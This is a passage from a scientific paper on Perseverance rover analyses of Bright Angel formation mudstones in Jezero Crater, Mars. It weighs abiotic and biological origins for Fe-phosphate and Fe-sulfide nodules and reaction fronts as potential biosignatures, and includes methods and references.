    &lt;p&gt;PIXL XRF analyses of reaction front rims reveal they are enriched in Fe, P and Zn relative to the mudstone they occur in (Fig. 5a,b); we interpret the rims to be made of the same Fe-phosphate minerals found in authigenic nodules. In the reaction front cores, a phase enriched in S-, Fe-, Ni- and Zn was detected (Fig. 5a,b). Insight into the identity of this phase comes from comparison with PIXL analyses of the Apollo Temple target in the same outcrop block as Cheyava Falls (Fig. 2). A ternary diagram of the molar proportions of Fe, S and Ca (Fig. 4d) shows that several spot analyses trend towards a composition on the Fe–S join with an Fe:S ratio of about 3:4. Most of these points are associated with a non-diffracting, millimetre-scale region in the sol 1213 Apollo Temple XRF map shown in Supplementary Fig. 13c,g. This region, like the reaction front cores, is also enriched in Zn and Ni, approaching values as high as 2,300 ± 670 ppm and 2,000 ± 570 ppm, respectively (Supplementary Information), We also detect copper in this region at a concentration of 419 ± 355 ppm (Supplementary Information). X-ray scattering properties indicate that both this region and the reaction front cores are light-element-deficient relative to FeO and SO3 (Supplementary Fig. 24). In LED-illuminated colour images, the high Fe–S region of Apollo Temple contains small dull brown-to-black-coloured masses (Supplementary Fig. 25). Taken together, these chemical and colour properties are consistent with the Fe-sulfide mineral greigite (Fe3+2Fe2+S4; also see Supplementary Fig. 26). The sulfide-bearing region is adjacent to other submillimetre-scale mineral accumulations having properties consistent with Fe and S in a range of oxidation states, including jarosite [KFe3+2(SO4)3(OH)6], which is an oxidation product of Fe-sulfide19, and a red–brown Fe-rich phase with low SO3, SiO2, Al2O3 and analytical totals, consistent with siderite (Supplementary Figs. 13g and 25).&lt;/p&gt;
    &lt;p&gt;Finally, in the Bright Angel formation mudstone facies, there is an inverse relationship between the inferred abundances of vivianite and greigite (Methods and Supplementary Information) versus mudstone oxidation state, inferred from the NIR/blue reflectance ratio in PIXL MCC images20. The NIR/blue ratio is sensitive to the relative abundance of Fe3+, like observations from Mastcam-Z (Supplementary Fig. 9a,b) and SuperCam (Supplementary Fig. 10). This inverse relationship is shown in Fig. 5c,d. Mudstone oxidation state also appears to be inversely related to the strength of the SHERLOC Raman G band. As shown in Fig. 5c,d, the Apollo Temple mudstone has the strongest G band, the highest inferred vivianite + greigite abundance, and the least-oxidized colour properties. In contrast, Malgosa Crest has no detectable organic matter, the lowest inferred vivianite + greigite abundance, and is the most-oxidized target analysed in the Bright Angel formation. Walhalla Glades and Cheyava Falls are intermediate between these two extremes.&lt;/p&gt;
    &lt;head rend="h2"&gt;An exploration of reaction mechanisms&lt;/head&gt;
    &lt;p&gt;Chemical and sedimentological data indicate that reduced iron and sulfur were generated, mobilized and precipitated following the deposition of fine-grained oxidized iron- and phosphorous-bearing sediment. Except when found in authigenic nodules and reaction front rims, phosphate is not associated with a mineral phase (for example, there is no indication that apatite or merrillite are present; Fig. 4c). Accordingly, we suggest that during deposition, phosphate was adsorbed on Fe3+-, Al- and Si-rich sediment grains21. In the Bright Angel area, iron and phosphate have been redistributed into authigenic nodules and reaction front rims; mass balance calculations suggest closed-system reorganization of these chemical components into vivianite (Supplementary Text). Fe-phosphate-enriched masses are not associated with Al2O3 (Supplementary Fig. 21h), which might otherwise suggest the co-existence of Al-phosphate minerals typical of transport of Al3+ and Fe3+ under oxidizing, low-pH conditions, such as variscite (AlPO4·2H2O) and strengite (FePO4·2H2O)22,23 (Fig. 4c). Instead, transport of Fe2+, Zn2+ and PO43− probably occurred under non-oxidizing conditions, which, combined with moderate pH, prevented mobilization of Al3+. Such conditions favour the precipitation of vivianite23. The apparent absence of Fe-phosphate nodules and reaction fronts in most of the conglomerate-bearing Masonic Temple area suggests a depositional facies control on the development of these specific features.&lt;/p&gt;
    &lt;p&gt;In the Bright Angel area, Fe-phosphate minerals are associated with organic matter (Fig. 3d). A pathway to the formation of vivianite is via the oxidation of this organic matter, which would have been coupled to the reductive dissolution of Fe3+ in sediment grains. This process would have liberated Fe2+ and PO43− to solution and precipitated Fe2+-phosphate. Similar precipitation and redox reactions have been considered for an occurrence of Mn–P-rich nodules in Gale Crater24, and for submillimetre-scale mixed valence Fe-phosphate grains in a conglomerate outcrop in the Jezero Western Fan25,26. Sulfate reduction coupled to organic matter oxidation could also be responsible for precipitation of Fe-sulfide in the Apollo Temple target and in the cores of reaction fronts in Cheyava Falls. As reduced Fe- and S-bearing phases formed, the mudstone colour properties were modified by iron reduction, bleaching it of its red colour in proportion to the abundance of available organic matter (Fig. 5c,d).&lt;/p&gt;
    &lt;p&gt;Here we consider the null hypothesis: that within the low-temperature sedimentary-diagenetic setting we have proposed for the Bright Angel formation, abiotic reactions produced ferrous Fe and reduced S and concentrated them in authigenic nodules and reaction fronts. The null hypothesis predicts that abiotic reactions can reduce sedimentary Fe3+ to aqueous Fe2+, which is then incorporated in the Fe-phosphate and Fe-sulfide minerals we have identified. A wide variety of organic carbon compounds are known to promote the abiotic reductive dissolution of ferric iron oxide minerals at temperatures between 10 °C and 80 °C (refs. 27,28,29). The presence of organic matter in Bright Angel formation mudstone (Fig. 3d), which could have been produced on Mars through abiotic synthesis30,31 or delivered from non-biological exogenic sources30,32, suggests that such reactions could have occurred. Further analysis is required to determine whether the specific organic compounds present in the Bright Angel formation can drive the reduction of mineral-hosted sedimentary Fe3+ at low temperature. Another possible pathway to the production of Fe2+ is through the abiotic oxidation of pyrite by Fe3+ (aq)33. This process would require both the presence of detrital pyrite and low solution pH, which would permit Fe3+ (aq) to be present. As previously discussed, neither condition appears to be met in the Bright Angel formation.&lt;/p&gt;
    &lt;p&gt;The null hypothesis also predicts that an abiotic source of dissolved sulfide was available to be incorporated in authigenic Fe-sulfide. Dissolved sulfide facilitates the reductive dissolution of ferric iron oxides, with half-lives ranging from years to hours depending on Fe-oxide mineralogy, crystallinity and pH34,35, providing another potential pathway to the production of Fe2+ (aq). Magmatic degassing of reduced sulfur-bearing gases (for example, ref. 36) to local groundwater could provide a potential source of dissolved sulfide during diagenesis. However, geological constraints demand that this sulfide migrate in from a distal, high-temperature sulfide-gas-producing system, to the low-temperature depositional-diagenetic environment of the Bright Angel formation. No evidence for sulfide-producing hydrothermal or magmatic systems was observed in the Crater Floor, Western Fan or Margin Unit before investigation of the Bright Angel formation. Abiotic reduction of sulfate to sulfide by organic matter is another possible source of dissolved sulfide that could both reduce Fe3+-bearing sediment and provide the reduced sulfur required to form Fe-sulfide minerals37. However, sulfate reduction by reduced carbon compounds is energetically demanding and kinetically inhibited by the symmetry of the SO42− ion38, so abiotic reaction rates are exceedingly slow at temperatures &amp;lt;150–200 °C (refs. 37,38). As discussed previously, the Bright Angel formation shows no unambiguous evidence that it was heated in contact with adjacent geologic units, and burial to depths in excess of about 5 km would be required to achieve temperatures &amp;gt;150 °C during the Noachian39.&lt;/p&gt;
    &lt;p&gt;Given the potential challenges to the null hypothesis, we consider here an alternative biological pathway for the formation of authigenic nodules and reaction fronts. On Earth, vivianite nodules are known to form in fresh water23,40,41 and marine42,43 settings as a by-product of low-temperature microbially mediated Fe-reduction reactions. Fe-sulfide minerals, such as greigite, pyrite and mackinawite, can also be formed as products of microbial sulfate reduction44,45, and have been observed in close spatial association with vivianite42. Greigite precipitation, from precursor mackinawite, is favoured by a high dissolved Fe2+/SO42− ratio, typical of diagenetic fluids in freshwater and ferruginous marine environments44. Repeated sulfidation of Fe2+ in vivianite followed by sulfide oxidation promotes stable incorporation of Zn and other heavy metals into vivianite46. Thus, Zn enrichment in nodules is consistent with a hybrid iron- and sulfate-reducing mechanism. Minerals like these, produced by Fe- and S-based metabolisms, provide some of the earliest chemical evidence for life on Earth47,48, and are thought to represent potential biosignatures in the search for life on Mars49. The fact that the reaction fronts observed in the Cheyava Falls target are defined by small, spot-shaped, bleached zones in an overall Fe-oxide-bearing, red-coloured rock invites comparison to terrestrial ‘reduction halos’ in modern marine sediments50 and ‘reduction spots’, which are concentrically zoned features found in rocks of Precambrian and younger age on Earth51. A biologically influenced origin has been proposed by some for reduction spots51, although this is not a universally held perspective52.&lt;/p&gt;
    &lt;p&gt;Under a biological scenario, the mixture of reactants available in the Bright Angel formation at the time of deposition could have provided raw ingredients for a set of biological redox reactions that drove Fe and S reduction, organic matter oxidation, and precipitation of Fe2+-phosphate and Fe-sulfide minerals. In this scenario, oxidized iron and sulfate would be used as terminal electron acceptors for organic matter consumption, promoting the formation of minerals through the release of chemical by-products: Fe-phosphate minerals in the case of iron reduction and Fe-sulfide minerals in the case of sulfate reduction. Where authigenic nodules were formed, the reaction would have shut off before additional reductive processes occurred. In the places where larger reaction fronts formed, the presence of sulfide-bearing cores suggests that sulfate-reducing metabolisms with lower energy yields could have taken hold once those regions of the rock had been depleted of available Fe3+, but had not yet exhausted organic carbon in the reaction front core.&lt;/p&gt;
    &lt;p&gt;In summary, our analysis leads us to conclude that the Bright Angel formation contains textures, chemical and mineral characteristics, and organic signatures that warrant consideration as ‘potential biosignatures’53,54,55, that is, “a feature that is consistent with biological processes and that, when encountered, challenges the researcher to attribute it either to inanimate or to biological processes, compelling them to gather more data before reaching a conclusion as to the presence or absence of life53”. This assessment is further supported by the geological context of the Bright Angel formation, which indicates that it is sedimentary in origin and deposited from water under habitable conditions. Many significant questions remain about the origin of the nodules and reaction fronts encountered by Perseverance. We suggest that further in situ, laboratory, modelling and field analogue research into both abiotic and biological processes that give rise to the suite of mineral and organic phases observed in the Bright Angel formation will improve our understanding of the conditions under which they formed. Ultimately, the return of samples from Mars for study on Earth, including the Sapphire Canyon sample collected from the Bright Angel formation, would provide the best opportunity to understand the processes that gave rise to the unique features described here.&lt;/p&gt;
    &lt;head rend="h2"&gt;Methods&lt;/head&gt;
    &lt;head rend="h3"&gt;Science instruments&lt;/head&gt;
    &lt;p&gt;The data used in this contribution were produced by: (1) the RIMFAX ground-penetrating radar56; (2) PIXL and its associated MCC57; (3) the SHERLOC instrument and its associated WATSON and ACI camera systems11; (4) the SuperCam instrument58,59; and (5) the Mastcam-Z instrument60.&lt;/p&gt;
    &lt;head rend="h3"&gt;Rock-surface preparation for analysis&lt;/head&gt;
    &lt;p&gt;Naturally exposed rock surfaces were prepared by removing surface dust with the gas dust removal tool61. To observe less weathered or flatter surfaces, several rocks were abraded using the rover’s abrading bit61 to produce circular approximately 5-cm-diameter-wide by approximately 5–10-mm-deep ‘abrasion patches’. Target names, surface preparation techniques, unit and outcrop associations, and the images that each target appears in are tabulated in Supplementary Table 3.&lt;/p&gt;
    &lt;head rend="h3"&gt;SHERLOC measurements&lt;/head&gt;
    &lt;p&gt;An overview of SHERLOC image and spectral map acquisition and standard processing methods are described in refs. 11,62. Colourized ACI images were produced using methods described in ref. 62. A focus mechanism motor failure on sol 1024 required SHERLOC measurements reported here to rely entirely on positioning by Perseverence’s robotic arm, without the capability to refine focus internally. Bright Angel measurements were therefore made at a systematic offset from best focus: sol 1180 Walhalla Glades was collected at approximately 1.2-mm offset, sol 1201 Cheyava Falls was collected at approximately 1.8-mm offset, and sol 1217 Apollo Temple was collected at approximately 1.1-mm offset. Sol 1242 Malgosa Crest was collected at &amp;lt;0.3-mm offset from best focus; the absence of a G-band signal at Malgosa Crest, despite its better placement, provides further confidence in the G-band peak classification of the other Bright Angel spectra. The spectral intensity is attenuated for measurements collected out of focus, with approximately 35% signal loss expected for 1.5-mm focus offsets. No other spectral artefacts are expected for out of focus measurements. The Raman D band, normally associated in visible Raman spectra with disordered carbonaceous matter such as kerogen, is not present in SHERLOC spectra from the Bright Angel targets. The D band is generally less prominent in deep-ultraviolet (for SHERLOC, 248.6 nm) Raman spectra than Raman spectra that rely on visible-light-wavelength excitation sources63. Furthermore, the focus offset associated with measurements collected at Bright Angel is expected to reduce the observed Raman signal of a potential D-band peak to the instrument noise level, as confirmed with focus offset tests on the organic-rich SaU 008 SHERLOC calibration target and with SHERLOC analogue laboratory instruments. The SHERLOC fused-silica window generates a minor optical background contribution that must be accounted for in SHERLOC spectra, as described by ref. 64. The Si–O-stretching overtone feature in the 1,600 cm−1 region is shown in Fig. 3d (grey traces) for comparison with target spectra, demonstrating the significantly larger contribution of the G-band signal to this spectral region for Bright Angel measurements.&lt;/p&gt;
    &lt;head rend="h3"&gt;PIXL element and mineral abundance estimates&lt;/head&gt;
    &lt;p&gt;In the Supplementary Data Tables, the bulk chemical composition determined from the sum of all XRF spectra collected by PIXL from each target is provided along with a black-and-white PIXL MCC image showing the footprint of the PIXL XRF scan area on the target. The sol number that the XRF and MCC data were collected on is shown, along with the number of XRF spectra (‘# XRF points’) that were collected from each target. The bulk element oxide and element abundances provided were calculated using the PIQUANT software package57,65 and have been corrected to remove the effects of diffraction and topographic roughness using the methods described in refs. 15,66.&lt;/p&gt;
    &lt;p&gt;Where needed to support discussion in the paper or Supplementary Text, the bulk chemical composition of regions of interest (ROIs) within PIXL XRF scans are also shown. These are accompanied by PIXL MCC images that show the locations of the individual PIXL XRF points that are included in the ROI. For all ROIs included in the Supplementary Data Tables, we have also included a list of the PIXL Motion Counter (PMC #s) positions57 for each XRF point in the ROI. These PMC locations describe which individual points are included in the ROI.&lt;/p&gt;
    &lt;p&gt;The element mobility index (τi,TiO2), shown in Fig. 5b, was calculated using the methods described in ref. 67. The calculation of %Fe in vivianite and %Fe in greigite, shown in Fig. 5d, was performed using chemical abundance data for individual PMCs in the ‘mudstone’ ROIs shown in the Supplementary Data Tables for the targets Apollo Temple, Cheyava Falls, Walhalla Glades, Steamboat Mountain and Malgosa Crest. For each PMC in each mudstone ROI, the Fe and P abundances (in mmol g−1) were combined in a molar Fe:P ratio of 3:2 until all P had been combined with Fe to form vivianite. The individual PMC results for the number of mmol g−1 of Fe in vivianite were then summed and compared with the total abundance of Fe in the mudstone ROI to determine the %Fe in vivianite parameter. In the next step, the remaining Fe in each PMC (after calculation of vivianite abundance) was combined with S in the appropriate molar Fe:S ratio until either all the Fe or all the S had been combined to form greigite. The individual PMC results for the number of mmol g−1 of Fe in greigite were then summed and compared with the total abundance of Fe in the mudstone ROI to determine the %Fe in greigite parameter.&lt;/p&gt;
    &lt;p&gt;Because PIQUANT assumes that elements are paired with oxygen atoms for the purposes of determining element abundances from the fitting of X-ray spectra, the Fe:S stoichiometry used for estimation of greigite abundance was modified to a value 3:4.42, which differs slightly from idealized griegite stoichiometry (Fe:S = 3:4). The oxide assumption in PIQUANT causes it to overestimate the abundance of S in greigite because it expects the S fluorescence signal to be attenuated by matrix oxygen. To account for this effect, we modelled idealized spectra in PIQUANT for Fe3S4 and FeOSO3 and then determined the ratio of Fe/S Kα1 fluorescence from each calculated spectrum. PIQUANT correctly reports a 1:1 molar ratio for FeOSO3. The adjusted greigite stoichiometric ratio was calculated from the Fe/S Kα1 ratio from Fe3S4 divided by the Fe/S Kα1 ratio from FeOSO3. The same calculation for the Fe-sulfide minerals troilite (FeS), pyrrhotite (Fe0.875S) and pyrite (FeS2) yields Fe:S ratios of 1:1.15, 1:1.29 and 1:2.11, respectively.&lt;/p&gt;
    &lt;head rend="h3"&gt;PIXL diffraction indexing of Ca-sulfate&lt;/head&gt;
    &lt;p&gt;PIXL has two detectors and so can detect X-ray diffraction from crystalline materials when energies of PIXL’s incident radiation happen to be in a diffracting condition with d-spacings and orientations of crystal lattices in the target materials14,15. When detected, X-ray diffraction can also be used to assess crystallinity, grain size and grain texture of a target14,15,66,68 and to distinguish among minerals with similar elemental compositions13,26. Here diffraction from the Ca-sulfate-rich areas in PIXL scans in Apollo Temple, Walhalla Glades and Steamboat Mountain abrasion patches were compared with modelled diffraction patterns for gypsum, anhydrite and bassanite to identify the most likely mineral phase that matches the observed diffraction as described in detail in ref. 13. A mineral was selected as indexed when the P value from the Fisher-transformed cross-correlation results13,69 was ≤0.01. Where P &amp;gt; 0.01, no mineral was selected as indexed. Owing to the difficulty phasing bassanite16, beam locations that indexed as bassanite were also treated as not indexed. A summary of the PIXL diffraction results is presented in Supplementary Table 2.&lt;/p&gt;
    &lt;head rend="h2"&gt;Data availability&lt;/head&gt;
    &lt;p&gt;The data presented in this paper are available on the NASA Planetary Data System Geoscience Node and Imaging and Cartography Node, which host dedicated repositories for data derived from the Mars 2020 Rover mission. The DOIs for these repositories are: Mars 2020 Mission bundle, https://doi.org/10.17189/1522642; PIXL Instrument bundle, https://doi.org/10.17189/1522645; derived data collection for PIXL individual PMC oxide quantifications, https://doi.org/10.17189/vth5-0676; RIMFAX Instrument bundle, https://doi.org/10.17189/1522644; SHERLOC Instrument bundle, https://doi.org/10.17189/1522643; SuperCam Instrument bundle, https://doi.org/10.17189/1522646; Mastcam-Z Science Imaging bundle, https://doi.org/10.17189/q3ts-c749; WATSON, ACI, and MCC imager bundle, https://doi.org/10.17189/1522846.&lt;/p&gt;
    &lt;head rend="h2"&gt;Code availability&lt;/head&gt;
    &lt;p&gt;Quantification of PIXL XRF data was conducted using PIQUANT65, a fundamental parameters XRF analysis software package developed for PIXL57. PIQUANT is embedded in the data visualization software package called PIXLISE57,70,71, which was used for analysis of quantified PIXL XRF data. The PIXLISE and PIQUANT software packages can be accessed at PIXLISE.org. PIXLISE source code versions are archived for reproducibility at OFS.io72.&lt;/p&gt;
    &lt;head rend="h2"&gt;References&lt;/head&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;
        &lt;p&gt;Farley, K. A. et al. Mars 2020 mission overview. Space Sci. Rev. https://doi.org/10.1007/s11214-020-00762-y (2020).&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Farley, K. A. et al. Aqueously altered igneous rocks sampled on the floor of Jezero Crater, Mars. Science 377, eabo2196 (2022).&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Simon, J. I. et al. Samples collected from the floor of Jezero Crater with the Mars 2020 Perseverance rover. J. Geophys. Res. Planets https://doi.org/10.1029/2022JE007474 (2023).&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Mangold, N. et al. Perseverance rover reveals an ancient delta-lake system and flood deposits at Jezero Crater, Mars. Science 374, 711–717 (2021).&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Stack, K. M. et al. Sedimentology and stratigraphy of the Shenandoah Formation, Western Fan, Jezero Crater, Mars. J. Geophys. Res. Planets https://doi.org/10.1029/2023JE008187 (2024).&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Bosak, T. et al. Astrobiological potential of rocks acquired by the Perseverance rover at a sedimentary fan front in Jezero Crater, Mars. AGU Adv. https://doi.org/10.1029/2024AV001241 (2024).&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Horgan, B. H. N., Anderson, R. B., Dromart, G., Amador, E. S. &amp;amp; Rice, M. S. The mineral diversity of Jezero Crater: evidence for possible lacustrine carbonates on Mars. Icarus https://doi.org/10.1016/j.icarus.2019.113526 (2020).&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Goudge, T. A., Mustard, J. F., Head, J. W., Fassett, C. I. &amp;amp; Wiseman, S. M. Assessing the mineralogy of the watershed and fan deposits of the Jezero Crater paleolake system, Mars. J. Geophys. Res. Planets 120, 775–808 (2015).&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Steele, A. et al. Comprehensive imaging and Raman spectroscopy of carbonate globules from Martian meteorite ALH 84001 and a terrestrial analogue from Svalbard. Meteorit. Planet. Sci. 42, 1549–1566 (2007).&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Steele, A. et al. Macromolecular carbon in Martian basalts. Meteorit. Planet. Sci. 47, A357–A357 (2012).&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Bhartia, R. et al. Perseverance’s Scanning Habitable Environments with Raman and Luminescence for Organics and Chemicals (SHERLOC) investigation. Space Sci. Rev. 217, 58 (2021).&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Scheller, E. L. et al. Inorganic interpretation of luminescent materials encountered by the Perseverance rover on Mars. Sci. Adv. 10, eadm8241 (2024).&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Jones, M. W. M. et al. In situ crystallographic mapping constrains sulfate precipitation and timing in Jezero Crater, Mars. Sci. Adv. 11, eadt3048 (2025).&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Orenstein, B. J. et al. In-situ mapping of monocrystalline regions on Mars. Icarus 420, 116202 (2024).&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Tice, M. M. et al. Alteration history of Seitah Formation rocks inferred by PIXL X-ray fluorescence, X-ray diffraction, and multispectral imaging on Mars. Sci. Adv. 8, eabp9084 (2022).&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Vaniman, D. T. et al. Gypsum, bassanite, and anhydrite at Gale Crater, Mars. Am. Mineral. 103, 1011–1020 (2018).&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Hardie, L. A. Gypsum-anhydrite equilibrium at one atmosphere pressure. Am. Mineral. 52, 171–17 (1967).&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Babechuk, M. G., Widdowson, M. &amp;amp; Kamber, B. S. Quantifying chemical weathering intensity and trace element release from two contrasting basalt profiles, Deccan Traps, India. Chem. Geol. 363, 56–75 (2014).&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Burns, R. G. &amp;amp; Fisher, D. S. Iron–sulfur mineralogy of Mars—magmatic evolution and chemical-weathering products. J. Geophys. Res. Solid Earth 95, 14415–14421 (1990).&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Henneke, J. et al. A radiometric correction method and performance characteristics for PIXL’s multispectral analysis using LEDs. Space Sci. Rev. https://doi.org/10.1007/s11214-023-01014-5 (2023).&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Rampe, E. B., Morris, R. V., Archer, P. D., Agresti, D. G. &amp;amp; Ming, D. W. Recognizing sulfate and phosphate complexes chemisorbed onto nanophase weathering products on Mars using in-situ and remote observations. Am. Mineral. 101, 678–689 (2016).&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Roncal-Herrero, T., Rodríguez-Blanco, J. D., Benning, L. G. &amp;amp; Oelkers, E. H. Precipitation of iron and aluminum phosphates directly from aqueous solution as a function of temperature from 50 to 200 °C. Crys. Growth Des. 9, 5197–5205 (2009).&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Nriagu, J. &amp;amp; Dell, C. Diagenetic formation of iron phosphates in recent lake sediments. Am. Mineral. 59, 934–946 (1974).&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Treiman, A. H. et al. Manganese–iron phosphate nodules at the Groken Site, Gale Crater, Mars. Minerals https://doi.org/10.3390/min13091122 (2023).&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Hausrath, E. M. et al. Phosphates on Mars and their importance as igneous, aqueous, and astrobiological indicators. Minerals https://doi.org/10.3390/min14060591 (2024).&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Kizovski, T. et al. Fe-phosphates in Jezero Crater as evidence for an ancient habitable environment on Mars. Nat. Commun. 16, 6470 (2025).&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Miller, W. P., Zelazny, L. W. &amp;amp; Martens, D. C. Dissolution of synthetic crystalline and noncrystalline iron oxides by organic acids. Geoderma 37, 1–13 (1986).&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Torres, R., Blesa, M. A. &amp;amp; Matijević, E. Interactions of metal hydrous oxides with chelating agents: IX. Reductive dissolution of hermatite and magnetite by aminocarboxylic acids. J. Colloid Interface Sci. 134, 475–485 (1990).&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Ionescu, D., Heim, C., Polerecky, L., Thiel, V. &amp;amp; De Beer, D. Biotic and abiotic oxidation and reduction of iron at circumneutral pH are inseparable processes under natural conditions. Geomicrobiol. J. 32, 221–230 (2015).&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Eigenbrode, J. L. et al. Organic matter preserved in 3-billion-year-old mudstones at Gale Crater, Mars. Science 360, 1096–1101 (2018).&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Steele, A. et al. Organic synthesis associated with serpentinization and carbonation on early Mars. Science 375, 172–177 (2022).&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Flynn, G. J., Nittler, L. R. &amp;amp; Engrand, C. Composition of cosmic dust: sources and implications for the early Solar System. Elements 12, 177–183 (2016).&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Rimstidt, J. D. &amp;amp; Vaughan, D. J. Pyrite oxidation: a state-of-the-art assessment of the reaction mechanism. Geochim. Cosmochim. Acta 67, 873–880 (2003).&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Afonso, M. D. &amp;amp; Stumm, W. Reductive dissolution of iron(III) (hydr)oxides by hydrogen-sulfide. Langmuir 8, 1671–1675 (1992).&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Canfield, D. E., Raiswell, R. &amp;amp; Bottrell, S. The reactivity of sedimentary iron minerals toward sulfide. Am. J. Sci. 292, 659–683 (1992).&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Gaillard, F. &amp;amp; Scaillet, B. The sulfur content of volcanic gases on Mars. Earth Planet. Sci. Lett. 279, 34–43 (2009).&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Machel, H. G. Bacterial and thermochemical sulfate reduction in diagenetic settings—old and new insights. Sediment. Geol. 140, 143–175 (2001).&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Rickard, D. &amp;amp; Luther, G. W. Chemistry of iron sulfides. Chem. Rev. 107, 514–562 (2007).&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;McSween, H. Y. Jr., Labotka, T. C. &amp;amp; Viviano-Beck, C. E. Metamorphism in the Martian crust. Meteorit. Planet. Sci. 50, 590–603 (2015).&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Cosmidis, J. et al. Biomineralization of iron-phosphates in the water column of Lake Pavin (Massif Central, France). Geochim. Cosmochim. Acta 126, 78–96 (2014).&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Vuillemin, A. et al. Vivianite formation in ferruginous sediments from Lake Towuti, Indonesia. Biogeosciences 17, 1955–1973 (2020).&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Hsu, T. W., Jiang, W. T. &amp;amp; Wang, Y. S. Authigenesis of vivianite as influenced by methane-induced sulfidization in cold-seep sediments off southwestern Taiwan. J. Asian Earth Sci. 89, 88–97 (2014).&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Liu, J. R. et al. Vivianite formation in methane-rich deep-sea sediments from the South China Sea. Biogeosciences 15, 6329–6348 (2018).&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Rickard, D., Roberts, A. P. &amp;amp; Navrotsky, A. Sedimentary greigite formation. Am. J. Sci. https://doi.org/10.2475/001c.121855 (2024).&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Picard, A., Gartman, A., Clarke, D. R. &amp;amp; Girguis, P. R. Sulfate-reducing bacteria influence the nucleation and growth of mackinawite and greigite. Geochim. Cosmochim. Acta 220, 367–384 (2018).&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Xu, Z. Y. et al. Sulfidation-reoxidation enhances heavy metal immobilization by vivianite. Water Res. 263, 122195 (2024).&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Craddock, P. R. &amp;amp; Dauphas, N. Iron and carbon isotope evidence for microbial iron respiration throughout the Archean. Earth Planet. Sci. Lett. 303, 121–132 (2011).&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Marin-Carbonne, J. et al. In situ Fe and S isotope analyses in pyrite from the 3.2 Ga Mendon Formation (Barberton Greenstone Belt, South Africa): evidence for early microbial iron reduction. Geobiology 18, 306–325 (2020).&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Banfield, J. F., Moreau, J. W., Chan, C. S., Welch, S. A. &amp;amp; Little, B. Mineralogical biosignatures and the search for life on Mars. Astrobiology 1, 447–465 (2001).&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Thomson, J., Higgs, N. C. &amp;amp; Colley, S. A geochemical investigation of reduction haloes developed under turbidites in brown clay. Mar. Geol. 89, 315–330 (1989).&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Spinks, S. C., Parnell, J. &amp;amp; Bowden, S. A. Reduction spots in the Mesoproterozoic age: implications for life in the early terrestrial record. Int. J. Astrobiol. 9, 209–216 (2010).&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Kawahara, H. et al. Bleached-spot formation in Fe-oxide-rich rock by inorganic process. Chem. Geol. 609, 121049 (2022).&lt;/p&gt;
      &lt;/item&gt;
